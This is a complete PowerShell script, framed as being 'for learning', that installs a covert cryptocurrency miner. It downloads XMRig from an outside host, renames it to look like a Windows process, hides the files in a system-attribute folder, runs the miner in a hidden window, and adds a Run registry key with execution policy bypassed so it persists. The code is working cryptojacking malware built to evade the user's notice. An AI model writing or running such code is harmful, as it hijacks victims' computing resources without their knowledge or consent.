# Refined PowerShell Miner Configuration Script for Learning

# Variables
$desktop = [Environment]::GetFolderPath("Desktop")
$hiddenFolder = "$desktop\.WindowsCache"
$exeName = "winhost.exe" # Renamed miner executable
$wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1" # Your wallet address
$pool = "159.203.162.18:3333" # Mining pool
$password = "x"
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$zipPath = "$hiddenFolder\xmrig.zip"
$logFile = "$hiddenFolder\miner.log"
$configPath = "$hiddenFolder\config.json"
$startupKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$startupName = "WinCacheHost"

# --- Configuration and Setup ---

# 1. Create hidden folder
# This block ensures the hidden folder exists and has hidden/system attributes.
If (!(Test-Path $hiddenFolder)) {
    Write-Host "Creating hidden folder: $hiddenFolder"
    New-Item -ItemType Directory -Force -Path $hiddenFolder | Out-Null
    # Set hidden and system attributes
    attrib +h +s $hiddenFolder
} else {
    Write-Host "Hidden folder already exists: $hiddenFolder"
}

# 2. Download & Extract Miner
# This section now ensures a fresh download and extraction every time.
Write-Host "Ensuring fresh miner executable..."

# Clean up any existing miner files before re-downloading/extracting
Remove-Item "$hiddenFolder\$exeName", "$zipPath", "$hiddenFolder\tmp" -Recurse -Force -ErrorAction SilentlyContinue

try {
    Write-Host "Downloading XMRig from $xmrigUrl to $zipPath"
    Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipPath -ErrorAction Stop

    Write-Host "Extracting XMRig archive to $hiddenFolder\tmp"
    Expand-Archive -Path $zipPath -DestinationPath "$hiddenFolder\tmp" -Force -ErrorAction Stop

    # Find the xmrig.exe inside the extracted temporary folder
    $exe = Get-ChildItem "$hiddenFolder\tmp" -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    If ($exe) {
        Write-Host "Copying $($exe.FullName) to $hiddenFolder\$exeName"
        Copy-Item $exe.FullName "$hiddenFolder\$exeName" -Force
        # Make the copied executable hidden
        attrib +h "$hiddenFolder\$exeName"
    } else {
        Write-Warning "Could not find xmrig.exe in extracted archive."
    }
}
catch {
    Write-Error "Error during download or extraction: $($_.Exception.Message)"
    # Exit script if critical error occurs during setup
    exit 1
}
finally {
    # Clean up temporary extraction folder and zip file
    Write-Host "Cleaning up temporary files..."
    Remove-Item "$hiddenFolder\tmp", "$zipPath" -Recurse -Force -ErrorAction SilentlyContinue
}

# 3. Create/Update config.json
Write-Host "Creating/Updating miner configuration file: $configPath"
$config = @{
    api = @{ id = "def" }
    autosave = $true
    randomx = @{ "1gb-pages" = $false; "huge-pages" = $false }
    cpu = @{
        enabled = $true
        "max-threads-hint" = 20 # Limit CPU threads to 20
        priority = 3 # Lower priority to make it less impactful on system responsiveness
    }
    # For learning purposes, setting cuda and opencl to false to avoid GPU usage by default
    # If you intend to use GPUs, you'd need to configure 'devices' within these sections.
    opencl = @{ enabled = $false }
    cuda = @{ enabled = $false } # Set to false to disable GPU mining entirely for learning CPU aspects

    pools = @(@{
        url = "$pool"
        user = "$wallet"
        pass = "$password"
        algo = "rx" # RandomX algorithm for CPU mining
        tls = $false
    })
    "print-time" = 60 # Log statistics every 60 seconds
    "donate-level" = 1 # XMRig developer donation level
    "log-file" = $logFile # Path to the log file
    # Additional settings for stealth (though limited for AV)
    "syslog" = $false # Disable system logging
    "background" = $true # Run in background (XMRig specific)
}
$config | ConvertTo-Json -Depth 10 | Set-Content -Path $configPath -Encoding UTF8

# 4. Start Miner Process
Write-Host "Starting miner process..."
# Start the miner hidden, in its working directory
Start-Process -FilePath "$hiddenFolder\$exeName" -WorkingDirectory $hiddenFolder -WindowStyle Hidden -ArgumentList "--config=$configPath"

# 5. Add to Startup (Persistency)
Write-Host "Adding script to Windows startup for persistence..."
try {
    Set-ItemProperty -Path $startupKey -Name $startupName -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MyInvocation.MyCommand.Definition`"" -Force
    Write-Host "Startup entry created successfully."
}
catch {
    Write-Error "Failed to create startup entry: $($_.Exception.Message)"
}

Write-Host "Script execution completed."
